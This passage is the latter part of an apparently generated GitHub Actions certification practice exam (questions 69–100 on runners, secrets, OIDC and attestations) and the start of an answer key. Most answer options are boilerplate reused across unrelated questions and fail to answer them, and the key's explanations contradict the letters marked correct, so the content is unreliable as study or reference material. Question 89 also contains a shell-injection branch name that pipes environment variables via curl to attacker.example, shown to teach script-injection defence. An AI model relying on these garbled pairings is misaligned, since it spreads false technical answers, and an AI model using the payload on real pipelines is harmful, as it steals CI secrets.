- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 70. In public repo `vireobio/open-fastq`, a first-time external contributor submits PR `#19` (`held in Waiting for approval`), a maintainer approves and runs CI on commit `111aaa`, and 5 minutes later the external contributor force-pushes malicious commit `222bbb` to the same open PR `#19`. Does `222bbb` run automatically?

- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately

### 71. VireoBio Genomics establishes FDA 21 CFR Part 11 change-control policies for GitHub Actions across regulated repositories. Which three controls enforce traceability, immutability, and separation of duties? Select three.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **C.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **F.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)

### 72. VireoBio Genomics deploys GA Actions Runner Controller (`ARC`) on GKE using `gha-runner-scale-set` named `bio-arm64-runners`. In `.github/workflows/align.yml`, what `runs-on:` value routes jobs specifically to that ARC scale set? (`Note: ARC scale sets do NOT accept extra custom label arrays alongside the scale-set name!`) Complete `runs-on: ____`.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 73. VireoBio Genomics runs CUDA 12.6 genome alignment integration benchmarks requiring NVIDIA T4 / A10G GPUs without maintaining Kubernetes GPU device plugins. Which GitHub-hosted runner option provides managed GPU instances natively?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 74. VireoBio Genomics deploys autoscaling Kubernetes ARC (`gha-runner-scale-set`) runners inside a HIPAA-isolated EKS VPC to run `Internal` and `Private` genomics workflows with Immutable Actions enabled. Order the setup and firewall steps.

- **A.** Create an org GitHub App (`runner` perms) & K8s Secret → Create a Runner Group (`no Public repos`; scoped repos) → Deploy `gha-runner-scale-set` controller + scale set (`min: 0`) → Allow egress to `github.com`, `*.actions...`, and `ghcr.io`
- **B.** Bake `./config.sh` `.runner` files into a VM image cloned across 20 pods → Attach an `arm64` macOS Larger runner to Azure VNet → Store cluster kubeconfigs in plain-text `vars.*` → Ignore queue metrics
- **C.** Authenticate ARC with a personal developer PAT → Enable `Allow public repositories` on the Runner Group → Mount host `/var/run/docker.sock` across stateful pods → Block `*.actions.githubusercontent.com` and `ghcr.io` on the firewall
- **D.** Deploy deprecated `summerwind` webhook ARC with inbound port 443 open → Skip Runner Group scoping across all org repos → Keep persistent workspaces across unrelated jobs → Disable Kubernetes RBAC

### 75. VireoBio Genomics locks down self-hosted runner firewall egress to an explicit FQDN allowlist. After Immutable Actions rolls out, workflows fail downloading OCI-packaged actions with `403/timeout`. Complete the two required HTTPS (`443`) registry domains alongside `github.com` and `api.github.com`: `*.actions.githubusercontent.com` (`including pkg.actions.githubusercontent.com`) and `____`.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions

### 76. VireoBio Genomics connects GitHub-hosted Larger runners directly to an Azure Virtual Network (`10.80.0.0/16`) hosting private Azure Blob Storage and ACR endpoints while keeping Enterprise IP allow lists active. Which two architectural facts apply? Select two.

- **A.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **B.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **C.** Attach **Azure Private Networking** (`GitHub.Network/networkSettings`) to Linux/Windows Larger runners and allow `*.actions.githubusercontent.com` (`pkg.actions...`) + `ghcr.io` on firewalls
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 77. A self-hosted runner on `10.80.4.19` uses corporate proxy `http://squid.vireobio.internal:3128` configured in `.env` (`https_proxy=...`), causing steps that query internal Kubernetes API `https://k8s.vireobio.internal` (`10.80.0.0/16`) to route wrongly to external Squid and fail `502`. Complete the `.env` bypass variable: `____=localhost,127.0.0.1,.vireobio.internal,10.80.0.0/16`.

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`

### 78. VireoBio Genomics maintains two Runner Groups: `hipaa-prod-runners` (`restricted to 4 clinical repos`) and `default` (`accessible to all Private/Internal repos`). Can a single self-hosted runner instance belong to BOTH `hipaa-prod-runners` and `default` simultaneously?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 79. VireoBio Genomics restricts Runner Group `hipaa-prod-runners` using `Restrict workflows that can run on this runner group` -> `vireobio/sec-ci/.github/workflows/clinical-deploy.yml@refs/tags/v2.0.0`. Which two security guarantees does this provide? Select two.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Deploy ephemeral `ARC` (`gha-runner-scale-set`) or Larger runners inside **Runner Groups** restricted to selected orgs, selected repos, and trusted workflow paths (`never Public repos`)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **F.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`

### 80. You run `./config.sh --check --url https://github.com/vireobio --pat <token>` on a degraded self-hosted Linux runner host in VireoBio Genomics's data center. What does `./config.sh --check` diagnose?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`

### 81. VireoBio Genomics runs Docker-less Kubernetes ARC pods (`runner-only mode` without DinD) and pre-bakes `bwa-mem2`, `samtools`, `cmake`, and Node/Python SDKs directly into a custom container image derived from `ghcr.io/actions/actions-runner:latest`. What operational caveat must the image pipeline maintain?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs

### 82. On stateful self-hosted macOS bioinformatics workstations where ephemeral VM reimaging takes too long, orphaned processes and `/tmp` scratch files occasionally linger after jobs finish. Which runner `.env` hook executes an admin cleanup script automatically after EVERY job completes?

- **A.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 83. In `vireobio/assay-kit`, a developer wants job `eu-compliance` to run ONLY when non-sensitive toggle `ENABLE_EU_GDPR` is set to `'true'` at the Organization or Repository level, evaluated directly inside job-level `if:`. Complete the valid job-level condition: `if: ${{ ____.ENABLE_EU_GDPR == 'true' }}`.

- **A.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)
- **B.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 84. VireoBio Genomics stores shared non-secret endpoints in `vars.*` and credentials in `secrets.*` across Organization, Repository, and Environment (`staging`, `production`) levels. Complete the override precedence order from highest priority (`winner`) to lowest: `____ > Repository > Organization`.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 85. VireoBio Genomics's secret-management service rotates Organization Actions secret `LIMS_WEBHOOK_HMAC` across `Selected repositories` via the GitHub REST API. Place the GitHub App token, public-key lookup, LibSodium sealed-box encryption, and `PUT` call steps in exact order.

- **A.** Mint an App token (`organization_actions_secrets: write`) → GET `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`) → Encrypt value client-side via LibSodium `crypto_box_seal` → PUT `/orgs/{org}/actions/secrets/{name}` (`selected` repos)
- **B.** Commit the encrypted blob into `.github/workflows/rotate.yml` → Encrypt with a local AES passphrase unknown to GitHub → Issue `admin:enterprise` classic PATs everywhere → Reboot self-hosted runners to load secrets
- **C.** Name the secret `GITHUB_API_KEY` (`reserved GITHUB_ prefix`) → Upload a `96 KB` secret (`exceeding the 48 KB cap`) → Send unauthenticated curl calls → Expect Org secrets to override `production` Environment secrets
- **D.** POST the plaintext secret to `/orgs/{org}/actions/variables` → Base64-encode without LibSodium encryption → Set `visibility: "all"` exposing secrets to `Public` repos → Read plaintext back via `GET /orgs/{org}/actions/secrets/{name}`

### 86. A workflow step in `vireobio/clinical-core` stores a multi-field JSON credential blob in `secrets.GCP_SA_JSON`, parses field `.private_key_id` using `jq -r .private_key_id`, and assigns it to `$KEY_ID`. To ensure `$KEY_ID` is also masked if echoed later, what should the script emit before printing anything?

- **A.** Manage secrets & variables programmatically via REST API (`encrypting secrets client-side with LibSodium crypto_box_seal against .../public-key`) or `gh secret set` / `gh variable set`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

---

## Domain 5 — Secure and optimize automation (10–15% official weight · 14 questions)

### 87. VireoBio Genomics requires FDA quality assurance sign-off AND ServiceNow change-freeze verification before any job deploys to `environment: clinical-prod`. Proposed solution: Configure Deployment Environment `clinical-prod` with `Required reviewers: @vireobio/qa-approvers`, `Prevent self-review` checked, `Selected branches: release/*`, and a custom deployment protection rule backed by the ServiceNow GitHub App. Does this meet the goal?

- **A.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 88. When vetting third-party action `thirdparty/samtools-helper@v1` from GitHub Marketplace, your security engineer notices `runs: { using: 'node20', main: 'dist/index.js', post: 'dist/telemetry.js' }` where `dist/telemetry.js` posts `process.env` to an external IP! Why did inspecting only `src/index.ts` miss this backdoor?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)

### 89. In `vireobio/aligner-cli`, a PR branch-naming linter runs `run: | if [[ ! "${{ github.head_ref }}" =~ ^(feat|fix)/ ]]; then exit 1; fi`. An external fork PR uses branch name `feat/"; curl https://attacker.example/$(env|base64) #`. Proposed solution: Keep `${{ github.head_ref }}` directly inside the `run:` bash test expression. Does this meet the goal?

- **A.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **B.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`

### 90. VireoBio Genomics runs CodeQL `actions` scanning (`javascript-typescript` / `actions` ecosystem) directly against `.github/workflows/*.yml` across all repositories. Which two workflow vulnerability classes does CodeQL `actions` analysis automatically flag on PRs? Select two.

- **A.** Pass untrusted `github.event.*` text (`PR titles, branch names, comments`) through intermediate `env:` variables (`never raw ${{ ... }} inside run:`) and never checkout untrusted forks in `pull_request_target`
- **B.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`

### 91. In `vireobio/variant-action`, release workflow `publish-release.yml` needs `GITHUB_TOKEN` strictly to create a GitHub Release (`uploading release tarball assets`) and sign SLSA build provenance attestations. Complete the minimal job `permissions:` block: `{ contents: ____, id-token: write, attestations: write }`.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls

### 92. A Composite action in `vireobio/assay-kit` invokes `gh pr comment` using `GH_TOKEN: ${{ github.token }}`. Is `${{ github.token }}` a separate credential from `${{ secrets.GITHUB_TOKEN }}`, and what scope grants `gh pr comment`?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 93. VireoBio Genomics centralizes AWS ECR pushes inside reusable workflow `vireobio/ci-core/.github/workflows/ecr-push.yml` called by 50 repos. You want AWS IAM to trust ANY repo in org `vireobio` ONLY when executing THAT exact reusable workflow (`not ad-hoc local repo YAML`). Which GitHub OIDC JWT claim verifies the exact reusable workflow path and ref?

- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Eliminate static cloud keys with **OIDC** (`permissions: id-token: write`), validating `iss` (`https://token.actions.githubusercontent.com`), `aud`, and strict `sub` / `job_workflow_ref` claims in AWS/Azure/GCP/Vault

### 94. VireoBio Genomics migrates `vireobio/clinical-core` AWS production deployments to passwordless OIDC federated roles protected by `production` Environment reviewers. Order the Environment setup, IAM OIDC trust policy, job YAML configuration, and runtime token exchange steps.

- **A.** Run deploy on `pull_request_target` checking out untrusted fork PR code → Set `permissions: write-all` globally → Request OIDC tokens before Environment reviewers approve → Print cloud tokens to `$GITHUB_STEP_SUMMARY`
- **B.** Set cloud OIDC trust `sub` to wildcard `repo:*:*` → Omit `permissions: id-token: write` on the job → Leave `environment:` unset while expecting reviewer gates to pause → Store static cloud root keys in `vars.*`
- **C.** Gate `production` Environment (`reviewers`, `main`) → Pin cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production` → Set `environment: production` & `id-token: write` → Exchange OIDC JWT at runtime & purge static keys
- **D.** Save a static OIDC JWT inside `secrets.OIDC_JWT` once a month → Disable TLS verification on cloud login steps → Skip `aud` validation in Vault → Allow developers to self-approve their own `production` runs

### 95. VireoBio Genomics generates Sigstore-backed SLSA Build Level 3 provenance attestations for `aligner-cli-linux-x64.tar.gz` and verifies them before clinical cluster rollout. Order the workflow permissions, artifact build, `actions/attest-build-provenance` signing, and `gh attestation verify` gate steps.

- **A.** Grant `id-token: write` & `attestations: write` in reusable CI → Build artifact / immutable `sha256:` image digest → Sign SLSA provenance via `actions/attest-build-provenance` → Verify via `gh attestation verify -R <o>/<r> --signer-workflow`
- **B.** Compute an unsigned `md5sum` in bash → Commit private PGP signing keys into Git → Run `gh attestation verify` without `-R` / `--owner` → Disable Immutable Releases on prod artifacts
- **C.** Compile binaries on an unmonitored developer laptop outside Actions → Upload unsigned binaries to a public bucket → Pin third-party actions to floating `@main` → Delete attestation bundles prior to admission checks
- **D.** Run `attest-build-provenance` with `permissions: read-all` only → Attest a mutable `:latest` image tag with no `sha256:` digest → Skip verification at deploy time → Edit build steps locally in caller repos

### 96. VireoBio Genomics pairs OIDC cloud federation with GitHub Artifact Attestations (`actions/attest-build-provenance` and `actions/attest-sbom`) on container images pushed to `ghcr.io`. Which two cryptographic controls make this pipeline resilient to tampering? Select two.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)
- **E.** Use **OIDC** (`id-token: write`) with strict `sub`/`aud` claims for cloud auth and sign/verify **SLSA Artifact Attestations** (`attestations: write` + `gh attestation verify`)
- **F.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 97. In `vireobio/aligner-cli`, `actions/cache@v4` caches a `3.2 GB` Rust `target/` directory on every pull request commit, causing the `10 GB` repo cache quota to thrash every 3 PRs (`evicting main-branch caches!`). Which `actions/cache` split pattern prevents PR branches from polluting and evicting `main` caches?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)

### 98. A repo admin wants to inspect active cache keys/sizes in `vireobio/aligner-cli` and delete a corrupted cache entry `cargo-linux-corrupt` immediately without waiting 7 days. Complete the GitHub CLI command (`or REST API equivalent`): `gh cache ____ cargo-linux-corrupt`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 99. VireoBio Genomics builds universal macOS wheels (`18 minutes` per run) on `macos-latest` (`~10x` minute multiplier) for every draft pull request push, burning 68% of the monthly Actions budget. Which two workflow changes cut macOS spend immediately while preserving release coverage?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 100. VireoBio Genomics compiles ARM64 Docker images (`linux/arm64`) using slow QEMU emulation on `ubuntu-24.04` (`x64`), taking `44 minutes` per build. Which native GitHub-hosted runner change drops build time to `4 minutes` AND lowers per-minute compute rates?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

---

## Answer Key and Explanations

### Question 1 — `D` (Author and manage workflows)

Correct answer: D (is correct). Yes — `repository_dispatch` listens on the default branch for authenticated `POST /repos/{owner}/{repo}/dispatches` requests matching `event_type` and exposes arbitrary JSON fields under `github.event.client_payload`. [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.

### Question 2 — `C, D` (Author and manage workflows)

Correct answers: C and D (are correct). A `workflow_run` workflow executes in the default/base branch privilege context (`even when triggered by an unprivileged fork PR run, requiring careful artifact handling`), and filtering `branches: [main]` restricts execution to `Primary CI` runs that ran on `main`. [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
